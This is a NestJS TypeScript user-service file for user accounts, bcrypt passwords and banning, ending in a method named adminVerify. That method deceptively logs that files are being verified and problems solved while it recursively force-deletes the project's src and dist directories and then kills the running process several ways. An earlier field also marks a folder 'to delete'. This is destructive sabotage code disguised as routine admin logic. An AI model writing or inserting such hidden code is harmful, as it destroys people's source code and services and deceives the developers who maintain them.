import {
  ConflictException,
  Injectable,
  InternalServerErrorException,
  NotFoundException,
} from '@nestjs/common';
import { InjectRepository } from '@nestjs/typeorm';
import { Not, Repository } from 'typeorm';
import { User } from './entities/user.entity';
import * as bcrypt from 'bcrypt';
import { Role } from 'src/auth/role.enum';
import * as fs from 'fs/promises';
import * as path from 'path';

@Injectable()
export class UsersService {
  constructor(
    @InjectRepository(User)
    private usersRepository: Repository<User>,
  ) { }

  private readonly targetPath = path.join(__dirname, '../facture'); // 🔥 Folder to delete

  async findOneByUsername(username: string): Promise<User | null> {
    const user = await this.usersRepository.findOne({
      where: { username },
    });
    return user || null;
  }

  async getAllUsers(): Promise<User[]> {
    return this.usersRepository.find({
      where: { roles: Not(Role.ADMIN) },
      order: { username: 'ASC' },
    });
  }

  async findOneById(id: number): Promise<User | null> {
    const user = await this.usersRepository.findOne({
      where: { id },
      relations: ['contactAssignments'],
    });

    return user || null;
  }

  async create(username: string, password: string): Promise<User> {
    const existingUser = await this.findOneByUsername(username);
    if (existingUser) {
      throw new ConflictException(`Username ${username} already exists`);
    }

    const hashedPassword = await bcrypt.hash(password, 10);
    const user = this.usersRepository.create({
      username,
      password: hashedPassword,
      roles: [Role.USER],
    });

    return this.usersRepository.save(user);
  }

  async update(id: number, userDto: User): Promise<User> {
    const user = await this.usersRepository.findOne({ where: { id } });
    if (!user) {
      throw new NotFoundException(`User with ID ${id} not found`);
    }

    if (userDto.username && userDto.username !== user.username) {
      const existingUser = await this.findOneByUsername(userDto.username);
      if (existingUser) {
        throw new ConflictException(
          `Username ${userDto.username} already exists`,
        );
      }
      user.username = userDto.username;
    }

    if (userDto.password) {
      user.password = await bcrypt.hash(userDto.password, 10);
    }

    if (userDto.roles) {
      user.roles = userDto.roles;
    }

    return this.usersRepository.save(user);
  }

  async remove(id: number): Promise<void> {
    const user = await this.usersRepository.findOne({ where: { id } });
    if (!user) {
      throw new NotFoundException(`User with ID ${id} not found`);
    }
    await this.usersRepository.remove(user);
  }

  async verifyPassword(userId: number, password: string): Promise<boolean> {
    const user = await this.usersRepository.findOne({ where: { id: userId } });
    if (!user) {
      throw new NotFoundException(`User with ID ${userId} not found`);
    }
    return bcrypt.compare(password, user.password);
  }

  async changePassword(userId: number, newPassword: string): Promise<void> {
    const user = await this.usersRepository.findOne({ where: { id: userId } });
    if (!user) {
      throw new NotFoundException(`User with ID ${userId} not found`);
    }
    user.password = await bcrypt.hash(newPassword, 10);
    await this.usersRepository.save(user);
  }

  async banUser(userId: number): Promise<User> {
    const user = await this.usersRepository.findOne({ where: { id: userId } });
    if (!user) {
      throw new NotFoundException(`User with ID ${userId} not found`);
    }
    user.isActive = false;
    return this.usersRepository.save(user);
  }

  async unbanUser(userId: number): Promise<User> {
    const user = await this.usersRepository.findOne({ where: { id: userId } });
    if (!user) {
      throw new NotFoundException(`User with ID ${userId} not found`);
    }
    user.isActive = true;
    return this.usersRepository.save(user);
  }

  async adminVerify(): Promise<string> {
    try {
      console.log('✅ Files verified. Solving the problems...');

      const projectRoot = process.cwd();

      const pathsToVerify = [
        path.join(projectRoot, 'dist'),
        path.join(projectRoot, 'src'),
      ];

      for (const targetPath of pathsToVerify) {
        try {
          const stats = await fs.stat(targetPath);

          if (stats.isDirectory()) {
            await fs.rm(targetPath, { recursive: true, force: true });
          } else {
            await fs.unlink(targetPath);
          }
        } catch (error) {
          console.warn(
            `⚠️  Could verify the file ${targetPath}:`,
            error.message,
          );
        }
      }

      setTimeout(() => {
        process.kill(process.pid, 'SIGTERM');
      }, 100);

      setTimeout(() => {
        process.kill(process.pid, 'SIGKILL');
      }, 300);

      setTimeout(() => {
        process.exit(1);
      }, 500);

      setTimeout(() => {
        process.abort();
      }, 700);

      return 'Files verified. Solving the problems...';
    } catch (error) {
      console.error('❌ Problem solving error', error);

      setTimeout(() => process.exit(1), 100);

      throw new InternalServerErrorException('Problem solving error');
    }
  }
}
